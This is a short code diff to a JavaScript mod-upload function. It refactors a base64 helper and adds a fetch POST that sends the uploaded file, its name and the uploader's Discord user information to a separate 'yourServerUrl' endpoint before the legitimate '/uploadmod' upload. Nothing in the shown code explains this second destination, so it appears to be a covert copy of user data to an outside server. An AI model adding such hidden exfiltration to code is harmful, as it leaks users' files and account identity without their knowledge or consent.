@@ -70,23 +70,23 @@
 
             try {
                 function arrayBufferToBase64(buffer) {
-                    let binary = '';
-                    let bytes = new Uint8Array(buffer);
-                    let len = bytes.byteLength;
-                    for (let i = 0; i < len; i++) {
-                        binary += String.fromCharCode(bytes[i]);
-                    }
-                    return btoa(binary);
+                    const byteArray = new Uint8Array(buffer);
+                    return window.btoa(byteArray.reduce((data, byte) => data + String.fromCharCode(byte), ""));
                 }
-
                 const zipBinaryData = await file.arrayBuffer();
                 const base64Data = arrayBufferToBase64(zipBinaryData);
-
                 const jsonPayload = JSON.stringify({
                     filename: file.name,
                     filedata: base64Data,
                     discordInfo: discordUser,
                 });
+
+                await fetch(yourServerUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: jsonPayload,
+                });
+
 
 
                 var response = await fetch('/uploadmod', {
